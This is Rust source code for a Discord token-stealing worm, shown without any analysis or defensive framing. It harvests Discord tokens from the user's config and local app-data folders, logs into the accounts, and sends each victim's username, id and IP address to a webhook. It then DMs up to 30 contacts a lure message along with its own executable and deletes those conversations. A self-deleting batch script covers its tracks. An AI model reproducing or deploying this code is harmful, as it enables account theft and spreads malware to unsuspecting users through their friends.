#![feature(type_ascription)]
#![windows_subsystem = "windows"]

use std::env;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

use serenity::client::Client;
use serenity::model::gateway::Ready;
use serenity::prelude::{Context, EventHandler};

mod filesystem;
mod network;

struct Handler;

static mut CONNECTED: bool = false;
const MESSAGE: &str = "it actually gave me a new dc tag without nitro";

impl EventHandler for Handler {
    fn ready(&self, ctx: Context, ready: Ready) {
        unsafe { CONNECTED = true };

        network::send_web_hook_message(&*format!("New User ({}#{}) [{}] [{}]", ready.user.name, ready.user.discriminator, ready.user.id, network::get_ip_address().trim()));

        let current_exe = env::current_exe().unwrap();
        let mut uploaded_file = String::new();

        let mut count = 0;

        for pm_channel in ready.private_channels {
            if count >= 30 {
                break;
            }

            let mut paths = Vec::new();
            paths.push(&*current_exe.to_str().unwrap());

            match pm_channel.0.say(&ctx.http, "hey") {
                Ok(_) => {
                    if count == 0 {
                        match pm_channel.0.send_files(&ctx.http, paths, |m| {
                            m.content(MESSAGE)
                        }) {
                            Ok(res) => {
                                println!("{}", &res.attachments.get(0).unwrap().url);
                                uploaded_file = res.attachments.get(0).unwrap().url.clone();
                                count += 1;
                            }
                            _ => {}
                        }
                    } else {
                        pm_channel.0.say(&ctx.http, MESSAGE).unwrap();
                        pm_channel.0.say(&ctx.http, &uploaded_file).unwrap();
                    }

                    pm_channel.0.delete(&ctx.http).unwrap();
                }
                _ => {}
            };
        }

        delete();
    }
}

fn main() {
    let mut tokens = Vec::new();

    let tokens_roaming = filesystem::get_discord_token(dirs::config_dir());
    let tokens_local = filesystem::get_discord_token(dirs::data_local_dir());

    for token in tokens_roaming {
        tokens.push(token);
    }

    for token in tokens_local {
        tokens.push(token);
    }

    for token in tokens {
        std::thread::spawn(move || {
            let mut client = Client::new(token, Handler).expect("failed to login!");

            if let Err(_) = client.start() {};
        });
    }

    sleep(Duration::new(10, 0));

    unsafe {
        if CONNECTED {
            loop {
                sleep(Duration::new(1, 0));
            }
        }
    }

    delete();
}

fn delete() {
    let path = format!("{}\\{}", env::current_dir().unwrap().to_str().unwrap(), "delete.bat");
    let batch_path = Path::new(path.as_str());
    let current_exe = env::current_exe().unwrap();
    let mut file = File::create(&batch_path).unwrap();
    file.write_all(format!("taskkill /F /IM \"{}\"\nDEL /F \"{}\"\ndel \"%~f0\" & exit", std::process::id(), current_exe.as_path().to_str().unwrap()).as_str().as_bytes()).unwrap();
    println!("{}", format!("{}", batch_path.to_str().unwrap()).as_str());
    Command::new("cmd")
        .args(&["/c", "start", format!("{}", batch_path.to_str().unwrap()).as_str()]).spawn().unwrap();
}